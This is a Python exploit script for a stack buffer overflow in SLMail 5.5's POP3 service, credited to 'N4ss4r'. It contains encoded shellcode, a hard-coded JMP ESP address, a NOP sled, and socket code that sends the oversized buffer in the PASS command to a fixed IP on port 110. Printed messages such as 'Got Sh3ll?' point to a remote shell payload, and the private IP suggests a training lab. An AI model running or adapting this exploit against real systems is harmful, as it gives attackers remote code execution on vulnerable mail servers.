#!/usr/bin/python

#SLMAIL 5.5 POP3 Stack Buffer OverFlow Exploit , JMP ESP address of 0x5f4a358f
#By N4ss4r



import socket

buf =  ""
buf += "\xb8\x72\x1d\xb7\xc9\xd9\xca\xd9\x74\x24\xf4\x5a\x29"
buf += "\xc9\xb1\x52\x83\xc2\x04\x31\x42\x0e\x03\x30\x13\x55"
buf += "\x3c\x48\xc3\x1b\xbf\xb0\x14\x7c\x49\x55\x25\xbc\x2d"
buf += "\x1e\x16\x0c\x25\x72\x9b\xe7\x6b\x66\x28\x85\xa3\x89"
buf += "\x99\x20\x92\xa4\x1a\x18\xe6\xa7\x98\x63\x3b\x07\xa0"
buf += "\xab\x4e\x46\xe5\xd6\xa3\x1a\xbe\x9d\x16\x8a\xcb\xe8"
buf += "\xaa\x21\x87\xfd\xaa\xd6\x50\xff\x9b\x49\xea\xa6\x3b"
buf += "\x68\x3f\xd3\x75\x72\x5c\xde\xcc\x09\x96\x94\xce\xdb"
buf += "\xe6\x55\x7c\x22\xc7\xa7\x7c\x63\xe0\x57\x0b\x9d\x12"
buf += "\xe5\x0c\x5a\x68\x31\x98\x78\xca\xb2\x3a\xa4\xea\x17"
buf += "\xdc\x2f\xe0\xdc\xaa\x77\xe5\xe3\x7f\x0c\x11\x6f\x7e"
buf += "\xc2\x93\x2b\xa5\xc6\xf8\xe8\xc4\x5f\xa5\x5f\xf8\xbf"
buf += "\x06\x3f\x5c\xb4\xab\x54\xed\x97\xa3\x99\xdc\x27\x34"
buf += "\xb6\x57\x54\x06\x19\xcc\xf2\x2a\xd2\xca\x05\x4c\xc9"
buf += "\xab\x99\xb3\xf2\xcb\xb0\x77\xa6\x9b\xaa\x5e\xc7\x77"
buf += "\x2a\x5e\x12\xd7\x7a\xf0\xcd\x98\x2a\xb0\xbd\x70\x20"
buf += "\x3f\xe1\x61\x4b\x95\x8a\x08\xb6\x7e\xbf\xc7\xb8\x4b"
buf += "\xd7\xd5\xb8\xb2\x9c\x53\x5e\xde\xf2\x35\xc9\x77\x6a"
buf += "\x1c\x81\xe6\x73\x8a\xec\x29\xff\x39\x11\xe7\x08\x37"
buf += "\x01\x90\xf8\x02\x7b\x37\x06\xb9\x13\xdb\x95\x26\xe3"
buf += "\x92\x85\xf0\xb4\xf3\x78\x09\x50\xee\x23\xa3\x46\xf3"
buf += "\xb2\x8c\xc2\x28\x07\x12\xcb\xbd\x33\x30\xdb\x7b\xbb"
buf += "\x7c\x8f\xd3\xea\x2a\x79\x92\x44\x9d\xd3\x4c\x3a\x77"
buf += "\xb3\x09\x70\x48\xc5\x15\x5d\x3e\x29\xa7\x08\x07\x56"
buf += "\x08\xdd\x8f\x2f\x74\x7d\x6f\xfa\x3c\x9d\x92\x2e\x49"
buf += "\x36\x0b\xbb\xf0\x5b\xac\x16\x36\x62\x2f\x92\xc7\x91"
buf += "\x2f\xd7\xc2\xde\xf7\x04\xbf\x4f\x92\x2a\x6c\x6f\xb7"


buffer ="A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 16 +  buf +  "C" * (3500-2606-4 - 351 -16)

#Socket creation

print("[*]SLMAIL exploit by N4ss4r")
print("[*]Evil Buffer Sent!")
print("[*]Got Sh3ll?")

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connect=s.connect(('10.11.12.111',110))
s.recv(1024)
s.send('USER test\r\n')
s.recv(1024)
s.send('PASS ' + buffer + '\r\n')
s.send('QUIT\r\n')
s.close
